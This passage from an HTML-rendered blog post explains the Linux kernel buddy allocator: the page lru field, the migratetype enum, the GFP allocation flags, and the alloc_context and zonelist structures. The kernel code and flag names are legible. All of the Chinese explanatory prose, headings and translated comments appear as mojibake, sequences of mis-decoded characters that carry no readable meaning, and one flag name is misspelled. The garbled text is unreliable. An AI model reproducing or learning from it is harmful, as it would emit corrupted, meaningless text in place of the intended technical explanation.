class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* é¡µç¼“å­˜ä¸åŒ¿åé¡µ */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @lru: Pageout é“¾è¡¨, ä¾‹å¦‚ active_list ä¾¿ç”±</span></span><br><span class="line"><span class="comment"> * lruvec-&gt;lru_lock ä¿æŠ¤ã€‚  </span></span><br><span class="line"><span class="comment"> * æœ‰æ—¶ä¼šè¢«é¡µæ‰€æœ‰è€…ä½œä¸ºå¸¸è§„é“¾è¡¨ä½¿ç”¨ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>page ç»“æ„ä½“ä¸­çš„ <code>lru</code> è¿™ä¸€å­—æ®µçš„ç±»å‹ä¸º <code>struct list_head</code>ï¼Œè¿™æ˜¯å†…æ ¸ç¼–ç¨‹ä¸­é€šç”¨çš„åŒå‘é“¾è¡¨ç»“æ„ï¼Œ<strong>free_list ä¸ lru é“¾è¡¨éƒ½ä½¿ç”¨è¯¥å­—æ®µ</strong> å°†é¡µç»“æ„ä½“ç»„ç»‡ä¸º_åŒå‘é“¾è¡¨_ï¼Œå³_ä¸€ä¸ªé¡µæ˜¯ä¸å¯èƒ½åŒæ—¶å‡ºç°åœ¨ lru é“¾è¡¨ä¸ buddy system ä¸­çš„_</p><h4 id="è¿ç§»ç±»å‹åˆ†é“¾è¡¨"><a href="#è¿ç§»ç±»å‹åˆ†é“¾è¡¨" class="headerlink" title="è¿ç§»ç±»å‹åˆ†é“¾è¡¨"></a><em>è¿ç§»ç±»å‹åˆ†é“¾è¡¨</em></h4><p>åœ¨è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°free_area ä¸­<strong>å¹¶éåªæœ‰ä¸€ä¸ªåŒå‘é“¾è¡¨</strong>ï¼Œè€Œæ˜¯æŒ‰ç…§ä¸åŒçš„â€œè¿ç§»ç±»å‹â€ï¼ˆmigrate typeï¼‰è¿›è¡Œåˆ†å¼€å­˜æ”¾ï¼Œè¿™æ˜¯ç”±äº_é¡µé¢è¿ç§»_æœºåˆ¶çš„å­˜åœ¨</p><p>é¡µé¢è¿ç§»ä¸»è¦ç”¨ä»¥è§£å†³å†…æ ¸ç©ºé—´ä¸­çš„<strong>ç¢ç‰‡é—®é¢˜</strong>ï¼Œåœ¨é•¿æœŸçš„è¿è¡Œä¹‹åå†…å­˜å½“ä¸­ç©ºé—²é¡µé¢çš„åˆ†å¸ƒå¯èƒ½æ˜¯é›¶æ•£çš„ï¼Œè¿™ä¾¿å¯¼è‡´äº†å†…æ ¸<strong>æœ‰å¯èƒ½æ— æ³•æ˜ å°„åˆ°è¶³å¤Ÿå¤§çš„è¿ç»­å†…å­˜</strong>ï¼Œå› æ­¤éœ€è¦è¿›è¡Œ_é¡µé¢è¿ç§»_â€”â€”å°†æ—§çš„é¡µé¢è¿ç§»åˆ°æ–°çš„ä½ç½®</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="ä»çŸ¥ä¹å·çš„å›¾.png"></p><p>ä½†<strong>å¹¶éæ‰€æœ‰çš„é¡µé¢éƒ½æ˜¯èƒ½å¤Ÿéšæ„è¿ç§»çš„</strong>ï¼Œå› æ­¤æˆ‘ä»¬åœ¨ buddy system å½“ä¸­è¿˜éœ€è¦å°†é¡µé¢æŒ‰ç…§è¿ç§»ç±»å‹è¿›è¡Œåˆ†ç±»</p><p>è¿ç§»ç±»å‹ç”±ä¸€ä¸ªæšä¸¾ç±»å‹å®šä¹‰ï¼Œå®šä¹‰äº <code>/include/linux/mmzone.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">MIGRATE_UNMOVABLE,</span><br><span class="line">MIGRATE_MOVABLE,</span><br><span class="line">MIGRATE_RECLAIMABLE,</span><br><span class="line">MIGRATE_PCPTYPES,<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment"> * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment"> * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment"> * __free_pageblock_cma() function.  What is important though</span></span><br><span class="line"><span class="comment"> * is that a range of pageblocks must be aligned to</span></span><br><span class="line"><span class="comment"> * MAX_ORDER_NR_PAGES should biggest page be bigger then</span></span><br><span class="line"><span class="comment"> * a single pageblock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">MIGRATE_ISOLATE,<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>MIGRATE_UNMOVABLE</strong>ï¼šè¿™ç±»å‹é¡µé¢åœ¨å†…å­˜å½“ä¸­æœ‰ç€å›ºå®šçš„ä½ç½®ï¼Œ<strong>ä¸èƒ½ç§»åŠ¨</strong></li><li><strong>MIGRATE_MOVABLE</strong>ï¼šè¿™ç±»é¡µé¢<strong>å¯ä»¥éšæ„ç§»åŠ¨</strong>ï¼Œä¾‹å¦‚ç”¨æˆ·ç©ºé—´çš„é¡µé¢ï¼Œæˆ‘ä»¬åªéœ€è¦å¤åˆ¶æ•°æ®åæ”¹å˜é¡µè¡¨æ˜ å°„å³å¯</li><li><strong>MIGRATE_RECLAIMABLE</strong>ï¼šè¿™ç±»é¡µé¢<strong>ä¸èƒ½ç›´æ¥ç§»åŠ¨ï¼Œä½†æ˜¯å¯ä»¥åˆ é™¤</strong>ï¼Œä¾‹å¦‚æ˜ å°„è‡ªæ–‡ä»¶çš„é¡µ</li><li><strong>MIGRATE_PCPTYPES</strong>ï¼š<code>per_cpu_pageset</code>ï¼Œå³æ¯ CPU é¡µå¸§ç¼“å­˜ï¼Œå…¶è¿ç§»<strong>ä»…é™äºåŒä¸€èŠ‚ç‚¹å†…</strong></li><li><strong>MIGRATE_CMA</strong>ï¼š<code>Contiguous Memory Allocator</code>ï¼Œå³<strong>è¿ç»­çš„ç‰©ç†å†…å­˜</strong></li><li><strong>MIGRATE_ISOLATE</strong>ï¼š<strong>ä¸èƒ½ä»è¯¥é“¾è¡¨åˆ†é…é¡µé¢</strong>ï¼Œè¯¥é“¾è¡¨ç”¨äºè·¨ NUMA èŠ‚ç‚¹è¿›è¡Œé¡µé¢ç§»åŠ¨ï¼Œå°†é¡µé¢ç§»åŠ¨åˆ°ä½¿ç”¨è¯¥é¡µé¢æœ€ä¸ºé¢‘ç¹çš„ CPU æ‰€å¤„èŠ‚ç‚¹</li><li><em>MIGRATE_TYPES_ï¼šè¡¨ç¤ºè¿ç§»ç±»å‹çš„æ•°ç›®ï¼Œ_å¹¶ä¸å­˜åœ¨è¿™ä¸€é“¾è¡¨</em></li></ul><p>ä»¥ <em>free_list[0]</em> ä½œä¸ºä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹ overviewï¼š</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><h3 id="nr-freeï¼šç©ºé—²é¡µé¢ï¼ˆå—ï¼‰è®¡æ•°"><a href="#nr-freeï¼šç©ºé—²é¡µé¢ï¼ˆå—ï¼‰è®¡æ•°" class="headerlink" title="nr_freeï¼šç©ºé—²é¡µé¢ï¼ˆå—ï¼‰è®¡æ•°"></a>nr_freeï¼šç©ºé—²é¡µé¢ï¼ˆå—ï¼‰è®¡æ•°</h3><p>è¯¥å­—æ®µè®°å½•äº†åœ¨å½“å‰ free_area ä¸­çš„ç©ºé—²é¡µé¢å—çš„æ•°é‡ï¼Œå¯¹äº free_area[0] ä»¥å¤–çš„ free_area è€Œè¨€å…¶å•ä½å¹¶éæ˜¯å•ä¸ªé¡µæ¡†ï¼Œè€Œæ˜¯ä»¥_å†…å­˜å—_ä¸ºå•ä½</p><h1 id="0x02-é¡µçš„åˆ†é…"><a href="#0x02-é¡µçš„åˆ†é…" class="headerlink" title="0x02.é¡µçš„åˆ†é…"></a>0x02.é¡µçš„åˆ†é…</h1><p>buddy system æä¾›äº†ä¸€ç»„ç”¨ä»¥è¿›è¡Œé¡µé¢åˆ†é…çš„æ¥å£ï¼Œæ¥ä¸‹æ¥ç¬”è€…å°†ä»¥è‡ªåº•å‘ä¸Šçš„æ–¹å¼è¿›è¡Œæºç åˆ†æ</p><h2 id="ä¸€ã€GFPï¼ˆget-free-pageï¼‰æ ‡å¿—ä½"><a href="#ä¸€ã€GFPï¼ˆget-free-pageï¼‰æ ‡å¿—ä½" class="headerlink" title="ä¸€ã€GFPï¼ˆget free pageï¼‰æ ‡å¿—ä½"></a>ä¸€ã€GFPï¼ˆget free pageï¼‰æ ‡å¿—ä½</h2><blockquote><p>GFPæ ‡å¿—ä½è¿™ä¸€èŠ‚åŸºæœ¬ä¸Šæ¬è¿è‡ª<a href="https://blog.csdn.net/yhb1047818384/article/details/112298996">è¿™ç¯‡æ–‡ç« </a></p></blockquote><p>åœ¨ kernel memory allocation ä¸­æˆ‘ä»¬ç»å¸¸èƒ½è§åˆ° <code>gfp_t</code> ç±»å‹ï¼Œå…¶è¡¨ç¤ºåˆ†é…æ—¶çš„æ ‡å¿—ä½ï¼Œå®šä¹‰åœ¨ <code>include/linux/gfp.h</code> ä¸­ï¼Œå¤§æ¦‚æœ‰å¦‚ä¸‹è¿™äº›å¯ç”¨æ ‡å¿—ä½ï¼š</p><ul><li><strong>å†…å­˜ç®¡ç†åŒºä¿®é¥°ç¬¦ (zone modifiers)</strong></li></ul><p>å†…å­˜ç®¡ç†åŒºä¿®é¥°ç¬¦ä¸»è¦æè¿°ä»å“ªäº›å†…å­˜ç®¡ç†åŒºæ¥åˆ†é…å†…å­˜</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_DMA</td><td align="left">ä»ZONE_DMAåŒºä¸­åˆ†é…å†…å­˜</td></tr><tr><td align="left">__GFP_HIGNMEM</td><td align="left">ä»ZONE_HIGHMEMåŒºä¸­åˆ†é…å†…å­˜</td></tr><tr><td align="left">__GFP_DMA32</td><td align="left">ä»ZONE_DMA32åŒºä¸­åˆ†é…å†…å­˜</td></tr><tr><td align="left">__GFP_MOVABLE</td><td align="left">å†…å­˜è§„æ•´æ—¶å¯ä»¥è¿ç§»æˆ–å›æ”¶é¡µé¢</td></tr></tbody></table><ul><li><strong>ç§»åŠ¨å’Œæ›¿æ¢ä¿®é¥°ç¬¦(mobility and placement modifiers)</strong></li></ul><p>ç§»åŠ¨å’Œæ›¿æ¢ä¿®é¥°ç¬¦ä¸»è¦è¡¨ç¤ºåˆ†é…å‡ºæ¥çš„é¡µé¢å…·æœ‰çš„è¿ç§»å±æ€§</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_RECLAIMABLE</td><td align="left">åˆ†é…çš„å†…å­˜é¡µé¢å¯ä»¥å›æ”¶</td></tr><tr><td align="left">__GFP_WRITE</td><td align="left">ç”³è¯·çš„é¡µé¢ä¼šè¢«å¼„æˆè„é¡µ</td></tr><tr><td align="left">__GFP_HARDWALL</td><td align="left">å¼ºåˆ¶ä½¿ç”¨cpusetå†…å­˜åˆ†é…ç­–ç•¥</td></tr><tr><td align="left">__GFP_THISNODE</td><td align="left">åœ¨æŒ‡å®šçš„èŠ‚ç‚¹ä¸Šåˆ†é…å†…å­˜</td></tr><tr><td align="left">__GFP_ACCOUNT</td><td align="left">kmemcgä¼šè®°å½•åˆ†é…è¿‡ç¨‹</td></tr></tbody></table><ul><li><strong>æ°´ä½ä¿®é¥°ç¬¦ ï¼ˆwatermark modifiersï¼‰</strong></li></ul><p>ä¸æ°´ä½çº¿ç›¸å…³çš„æ ‡å¿—ä½</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_ATOMIC</td><td align="left">é«˜ä¼˜å…ˆçº§åˆ†é…å†…å­˜ï¼Œåˆ†é…å™¨å¯ä»¥åˆ†é…æœ€ä½è­¦æˆ’æ°´ä½çº¿ä¸‹çš„é¢„ç•™å†…å­˜</td></tr><tr><td align="left">__GFP_HIGH</td><td align="left">åˆ†é…å†…å­˜çš„è¿‡ç¨‹ä¸­ä¸å¯ä»¥ç¡çœ æˆ–æ‰§è¡Œé¡µé¢å›æ”¶åŠ¨ä½œ</td></tr><tr><td align="left">__GFP_MEMALLOC</td><td align="left">å…è®¸è®¿é—®æ‰€æœ‰çš„å†…å­˜</td></tr><tr><td align="left">__GFP_NOMEMALLOC</td><td align="left">ä¸å…è®¸è®¿é—®æœ€ä½è­¦æˆ’æ°´ä½çº¿ä¸‹çš„ç³»ç»Ÿé¢„ç•™å†…å­˜</td></tr></tbody></table><ul><li><strong>é¡µé¢å›æ”¶ä¿®é¥°ç¬¦ï¼ˆreclaim modifiers)</strong></li></ul><p>ä¸é¡µé¢å›æ”¶ç›¸å…³çš„æ ‡å¿—ä½</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_IO</td><td align="left">å¯åŠ¨ç‰©ç†I&#x2F;Oä¼ è¾“</td></tr><tr><td align="left">__GFP_FS</td><td align="left">å…è®¸è°ƒç”¨åº•å±‚FSæ–‡ä»¶ç³»ç»Ÿã€‚å¯é¿å…åˆ†é…å™¨é€’å½’åˆ°å¯èƒ½å·²ç»æŒæœ‰é”çš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œ é¿å…æ­»é”</td></tr><tr><td align="left">__GFP_DIRECT_RECLAIM</td><td align="left">åˆ†é…å†…å­˜è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨ç›´æ¥å†…å­˜å›æ”¶</td></tr><tr><td align="left">__GFP_KSWAPD_RECLAIM</td><td align="left">å†…å­˜åˆ°è¾¾ä½æ°´ä½æ—¶å”¤é†’kswapdçº¿ç¨‹å¼‚æ­¥å›æ”¶å†…å­˜</td></tr><tr><td align="left">__GFP_RECLAIM</td><td align="left">è¡¨ç¤ºæ˜¯å¦å¯ä»¥ç›´æ¥å†…å­˜å›æ”¶æˆ–è€…ä½¿ç”¨kswapdçº¿ç¨‹è¿›è¡Œå›æ”¶</td></tr><tr><td align="left">__GFP_RETRY_MAYFAIL</td><td align="left">åˆ†é…å†…å­˜å¯ä»¥å¯èƒ½ä¼šå¤±è´¥ï¼Œä½†æ˜¯åœ¨ç”³è¯·è¿‡ç¨‹ä¸­ä¼šå›æ”¶ä¸€äº›ä¸å¿…è¦çš„å†…å­˜ï¼Œæ˜¯æ•´ä¸ªç³»ç»Ÿå—ç›Š</td></tr><tr><td align="left">__GFP_NOFAIL</td><td align="left">å†…å­˜åˆ†é…å¤±è´¥åæ— é™åˆ¶çš„é‡å¤å°è¯•ï¼ŒçŸ¥é“åˆ†é…æˆåŠŸ</td></tr><tr><td align="left">__GFP_NORETRY</td><td align="left">ç›´æ¥é¡µé¢å›æ”¶æˆ–è€…å†…å­˜è§„æ•´åè¿˜æ˜¯æ— æ³•åˆ†é…å†…å­˜æ—¶ï¼Œä¸å¯ç”¨retryåå¤å°è¯•åˆ†é…å†…å­˜ï¼Œç›´æ¥è¿”å›NULL</td></tr></tbody></table><ul><li><strong>è¡Œä¸ºä¿®é¥°ç¬¦ (action modifiers)</strong></li></ul><p>ä¸åˆ†é…æ—¶çš„è¡Œä¸ºç›¸å…³çš„æ ‡å¿—ä½</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_NOWARN</td><td align="left">å…³é—­å†…å­˜åˆ†é…è¿‡ç¨‹ä¸­çš„WARNING</td></tr><tr><td align="left">__GFP_COMP</td><td align="left">åˆ†é…çš„å†…å­˜é¡µé¢å°†è¢«ç»„åˆæˆå¤åˆé¡µcompound page</td></tr><tr><td align="left">__GFP_ZERO</td><td align="left">è¿”å›ä¸€ä¸ªå…¨éƒ¨å¡«å……ä¸º0çš„é¡µé¢</td></tr></tbody></table><ul><li><strong>ç»„åˆç±»å‹æ ‡å¿—(Useful GFP flag combinations)</strong></li></ul><p>å‰é¢æè¿°çš„ä¿®é¥°ç¬¦ç§è¿‡äºç¹å¤šï¼Œå› æ­¤linuxå®šä¹‰äº†ä¸€äº›ç»„åˆçš„ç±»å‹æ ‡å¿—ï¼Œä¾›å¼€å‘è€…ä½¿ç”¨ã€‚</p><table><thead><tr><th align="left">flag</th><th align="left">element</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">GFP_ATOMIC</td><td align="left">__GFP_HIGH |__GFP_ATOMIC |__GFP_KSWAPD_RECLAIM</td><td align="left">åˆ†é…è¿‡ç¨‹ä¸èƒ½ä¼‘çœ ï¼Œåˆ†é…å…·æœ‰é«˜ä¼˜å…ˆçº§ï¼Œå¯ä»¥è®¿é—®ç³»ç»Ÿé¢„ç•™å†…å­˜</td></tr><tr><td align="left">GFP_KERNEL</td><td align="left">__GFP_RECLAIM |__GFP_IO |__GFP_FS</td><td align="left">åˆ†é…å†…å­˜æ—¶å¯ä»¥è¢«é˜»å¡(å³ä¼‘çœ )</td></tr><tr><td align="left">GFP_KERNEL_ACCOUNT</td><td align="left">GFP_KERNEL |__GFP_ACCOUNT</td><td align="left">å’ŒGFP_KERNELä½œç”¨ä¸€æ ·ï¼Œä½†æ˜¯åˆ†é…çš„è¿‡ç¨‹ä¼šè¢«kmemcgè®°å½•</td></tr><tr><td align="left">GFP_NOWAIT</td><td align="left">__GFP_KSWAPD_RECLAIM</td><td align="left">åˆ†é…è¿‡ç¨‹ä¸­ä¸å…è®¸å› ç›´æ¥å†…å­˜å›æ”¶è€Œå¯¼è‡´åœé¡¿</td></tr><tr><td align="left">GFP_NOIO</td><td align="left">__GFP_RECLAIM</td><td align="left">ä¸éœ€è¦å¯åŠ¨ä»»ä½•çš„I&#x2F;Oæ“ä½œ</td></tr><tr><td align="left">GFP_NOFS</td><td align="left">__GFP_RECLAIM |__GFP_IO</td><td align="left">ä¸ä¼šæœ‰è®¿é—®ä»»ä½•æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œ</td></tr><tr><td align="left">GFP_USER</td><td align="left">__GFP_RECLAIM |__GFP_IO |__GFP_FS |__GFP_HARDWALL</td><td align="left">ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹åˆ†é…å†…å­˜</td></tr><tr><td align="left">GFP_DMA</td><td align="left">__GFP_DMA</td><td align="left">ä»ZONE_DMAåŒºåˆ†é…å†…å­˜</td></tr><tr><td align="left">GFP_DMA32</td><td align="left">__GFP_DMA32</td><td align="left">ä»ZONE_DMA32åŒºåˆ†é…å†…å­˜</td></tr><tr><td align="left">GFP_HIGHUSER</td><td align="left">GFP_USER | __GFP_HIGHMEM</td><td align="left">ç”¨æˆ·è¿›ç¨‹åˆ†é…å†…å­˜ï¼Œä¼˜å…ˆä½¿ç”¨ZONE_HIGHMEMï¼Œ ä¸”è¿™äº›é¡µé¢ä¸å…è®¸è¿ç§»</td></tr><tr><td align="left">GFP_HIGHUSER_MOVABLE</td><td align="left">GFP_HIGHUSER | __GFP_MOVABLE</td><td align="left">å’ŒGFP_HIGHUSERç±»ä¼¼ï¼Œä½†æ˜¯é¡µé¢å¯ä»¥è¿ç§»</td></tr><tr><td align="left">GFP_TRANSHUGE_LIGHT</td><td align="left">GFP_HIGHUSER_MOVABLE | __GFP_COMP | __GFP_NOMEMALLOC | __GFP_NOWARN) &amp; ~__GFP_RECLAIM</td><td align="left">é€æ˜å¤§é¡µçš„å†…å­˜åˆ†é…ï¼Œ lightè¡¨ç¤ºä¸è¿›è¡Œå†…å­˜å‹ç¼©å’Œå›æ”¶</td></tr><tr><td align="left">GFP_TRANSHUGE</td><td align="left">GFP_TRANSHUGE_LIGHT | __GFP_DIRECT_RECLAIM</td><td align="left">å’ŒGFP_TRANSHUGE_LIGHTç±»ä¼¼ï¼Œé€šå¸¸khugepagedä½¿ç”¨è¯¥æ ‡å¿—</td></tr></tbody></table><h2 id="äºŒã€alloc-context-ç»“æ„ä½“ï¼šåˆ†é…çš„ä¸Šä¸‹æ–‡"><a href="#äºŒã€alloc-context-ç»“æ„ä½“ï¼šåˆ†é…çš„ä¸Šä¸‹æ–‡" class="headerlink" title="äºŒã€alloc_context ç»“æ„ä½“ï¼šåˆ†é…çš„ä¸Šä¸‹æ–‡"></a>äºŒã€alloc_context ç»“æ„ä½“ï¼šåˆ†é…çš„ä¸Šä¸‹æ–‡</h2><p>è¿™æ˜¯ä¸€ä¸ªåˆ†é…è¿‡ç¨‹ä¸­éå¸¸é‡è¦çš„ç»“æ„ä½“ï¼Œç”¨æ¥è¡¨ç¤ºæˆ‘ä»¬å•æ¬¡å†…å­˜åˆ†é…çš„ä¸Šä¸‹æ–‡ä¿¡æ¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ç”¨ä»¥ä¿å­˜åœ¨åˆ†é…æ—¶æ¶‰åŠåˆ°çš„å‡½æ•°é—´ä¼ é€’çš„</span></span><br><span class="line"><span class="comment"> * ç»å¤§éƒ¨åˆ†çš„ä¸å¯å˜çš„åˆ†é…å‚æ•°çš„ç»“æ„ä½“ï¼Œ</span></span><br><span class="line"><span class="comment"> * åŒ…æ‹¬ alloc_pages å‡½æ•°æ—</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * nodemask, migratetype ä¸ highest_zoneidx ä»…åœ¨</span></span><br><span class="line"><span class="comment"> * __alloc_pages_nodemask() ä¸­è¢«åˆå§‹åŒ–ä¸€æ¬¡ï¼Œä¹‹åä¸å†æ”¹å˜.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * zonelist, preferred_zone ä¸ highest_zoneidx æœ€åˆåœ¨</span></span><br><span class="line"><span class="comment"> * __alloc_pages_nodemask() ä¸­ä¸ºå¿«é€Ÿè·¯å¾„è®¾ç½®, ä¹‹åå¯èƒ½ä¼šåœ¨</span></span><br><span class="line"><span class="comment"> * __alloc_pages_slowpath() ä¸­è¢«æ”¹å˜. å…¶ä»–æ‰€æœ‰çš„å‡½æ•°é€šè¿‡</span></span><br><span class="line"><span class="comment"> * å¸¸é‡æŒ‡é’ˆä¼ é€’è¯¥ç»“æ„ä½“ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> *<span class="title">zonelist</span>;</span></span><br><span class="line"><span class="type">nodemask_t</span> *nodemask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">preferred_zoneref</span>;</span></span><br><span class="line"><span class="type">int</span> migratetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * highest_zoneidx è¡¨ç¤ºåˆ†é…è¯·æ±‚ä¸­æœ€é«˜çš„å¯ç”¨ zone çš„ä¸‹æ ‡ã€‚</span></span><br><span class="line"><span class="comment"> * ç”±äº zone çš„æ€§è´¨, ç›¸è¾ƒäº highest_zoneidxï¼Œ</span></span><br><span class="line"><span class="comment"> * åœ¨æ›´ä½çš„ zone ä¸Šçš„å†…å­˜ä¼šç”± lowmem_reserve[highest_zoneidx] ä¿æŠ¤ã€‚</span></span><br><span class="line"><span class="comment"> * è¯‘æ³¨ï¼šå°±æ˜¯æ°´ä½çº¿æœºåˆ¶ï¼Œä¸è®°å¾—çš„å›å»çœ‹ä¸Šä¸€ç¯‡æ–‡ç« </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * highest_zoneidx åŒæ ·è¢«å›æ”¶/å‹ç¼©ä½¿ç”¨ä»¥é™åˆ¶ç›®æ ‡ zoneï¼Œ</span></span><br><span class="line"><span class="comment"> * å› ä¸ºé«˜äºè¯¥ä¸‹æ ‡çš„ zone æ— æ³•ç”¨äºæ­¤åˆ†é…è¯·æ±‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">highest_zoneidx</span>;</span></span><br><span class="line"><span class="type">bool</span> spread_dirty_pages;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹æˆå‘˜ï¼š</p><ul><li>zonelist</li></ul><p>è¯¥æˆå‘˜è¡¨ç¤ºåœ¨<strong>è¿™ä¸€æ¬¡çš„åˆ†é…ä¸Šä¸‹æ–‡</strong>ä¸­ï¼Œæˆ‘ä»¬å°†è¦æ“ä½œçš„ zone çš„<strong>åˆ—è¡¨</strong>ï¼Œå…¶ä¸ºä¸€ä¸ª <code>zonelist</code> ç±»å‹çš„<strong>ç»“æ„ä½“æ•°ç»„</strong>ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * å•æ¬¡åˆ†é…è¯·æ±‚åœ¨ä¸€ä¸ª zonelist ä¸Šæ“ä½œ. ä¸€ä¸ª zonelist ä¾¿æ˜¯ä¸€ç»„ zone çš„åˆ—è¡¨ï¼Œ</span></span><br><span class="line"><span class="comment"> * å…¶ä¸­ç¬¬ä¸€ä¸ª zone ä¸ºåˆ†é…çš„â€œç›®æ ‡â€ï¼Œè€Œå…¶ä»–çš„ zone ä¸ºåå¤‡çš„zoneï¼Œä¼˜å…ˆçº§é™ä½ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ä¸ºäº†æé«˜ zonelist çš„è¯»å–é€Ÿåº¦, åœ¨ zonerefs ä¸­åŒ…å«æ­£åœ¨è¢«è¯»å–çš„ entry çš„ zone indexã€‚</span></span><br><span class="line"><span class="comment"> * ç”¨æ¥è®¿é—®æ‰€ç»™çš„ zoneref ç»“æ„ä½“ä¿¡æ¯çš„å¸®åŠ©å‡½æ•°æœ‰ï¼š</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * zonelist_zone()- è¿”å›ä¸€ä¸ª struct zone çš„æŒ‡é’ˆä½œä¸º _zonerefs ä¸­çš„ä¸€ä¸ª entry</span></span><br><span class="line"><span class="comment"> * zonelist_zone_idx()- è¿”å›ä½œä¸º entry çš„ zone çš„ index</span></span><br><span class="line"><span class="comment"> * zonelist_node_idx()- 